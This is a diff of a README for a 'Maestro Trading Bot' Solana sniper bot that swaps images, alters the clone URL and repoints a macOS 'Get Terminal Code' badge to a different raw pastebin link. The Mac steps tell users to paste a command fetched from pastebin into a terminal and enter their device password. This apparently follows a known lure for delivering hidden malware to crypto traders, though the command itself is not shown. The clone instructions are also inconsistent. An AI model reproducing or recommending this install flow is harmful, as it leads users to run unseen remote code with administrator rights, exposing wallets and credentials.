@@ -2,7 +2,7 @@
 
 <div align="center">
 
-![Maestro Trading Logo](https://www.maestrobots.com/opengraph-image.png)
+![Maestro Trading Logo](https://i.ytimg.com/vi/Jh2xNxJ_SQ8/hq720.jpg)
 
 </div> 
 
@@ -62,8 +62,6 @@ Once installation completes, you'll have a fully configured trading environment 
 
 The system is designed to identify and exploit market inefficiencies while maintaining strict risk parameters and capital preservation rules.
 
-![Maestro Trading Interface 2](https://assets.coingecko.com/coingecko/public/ckeditor_assets/pictures/22067/content_What_Is_Maestro_%281%29.webp)
-
 ---
 
 ## ⚙️ Installing and using Maestro Trading Bot on Windows
@@ -72,7 +70,7 @@ The system is designed to identify and exploit market inefficiencies while maint
 
 1. Cloning the repository
 ```
-git clone https://github.com/greengod63/solana-sniper-bot.git
+git clone https://github.com/Maestro-Trading-Bot
 cd solana-sniper-bot
 ```
 2. Installation of all packages
@@ -149,7 +147,7 @@ maestro-trading-bot/
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/dZJ9Vx46)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/Eaw7yHzu)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation. 
